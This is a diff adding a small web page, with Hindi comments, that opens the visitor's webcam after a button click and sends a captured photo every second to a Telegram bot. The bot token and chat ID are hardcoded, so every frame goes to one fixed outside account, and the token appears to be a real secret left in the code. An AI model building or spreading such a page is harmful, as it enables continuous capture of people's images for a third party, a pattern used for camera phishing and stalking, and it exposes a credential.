@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Auto Photo Capture</title>
+    <style>
+        body { font-family: Arial; text-align: center; }
+        #camera { width: 400px; margin: 20px auto; }
+        video { width: 100%; border: 2px solid #333; }
+        button { padding: 10px 20px; background: #0088cc; color: white; border: none; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>Auto Photo Capture & Send to Telegram</h1>
+    <div id="camera">
+        <video id="video" autoplay></video>
+        <button id="startBtn">Start Camera</button>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const startBtn = document.getElementById('startBtn');
+        let interval;
+
+        // 1. कैमरा एक्सेस करें
+        startBtn.addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                startBtn.disabled = true;
+
+                // 2. हर सेकंड फोटो कैप्चर करें और Telegram पर भेजें
+                interval = setInterval(captureAndSend, 1000); // 1000ms = 1 सेकंड
+            } catch (err) {
+                alert("Error: " + err.message);
+            }
+        });
+
+        // 3. फोटो कैप्चर करके Telegram API को भेजें
+        async function captureAndSend() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // इमेज को Blob में बदलें
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('photo', blob, 'capture.jpg');
+
+                // Telegram Bot API को भेजें (आपको अपना BOT_TOKEN और CHAT_ID डालना होगा)
+                const BOT_TOKEN = "7576751073:AAEDpy6p2tg3yUTxNyNpprHNJQw3VbQvrYQ";
+                const CHAT_ID = "7360759493";
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    console.log("Photo sent to Telegram!");
+                } catch (err) {
+                    console.error("Error sending photo:", err);
+                }
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+  </html>
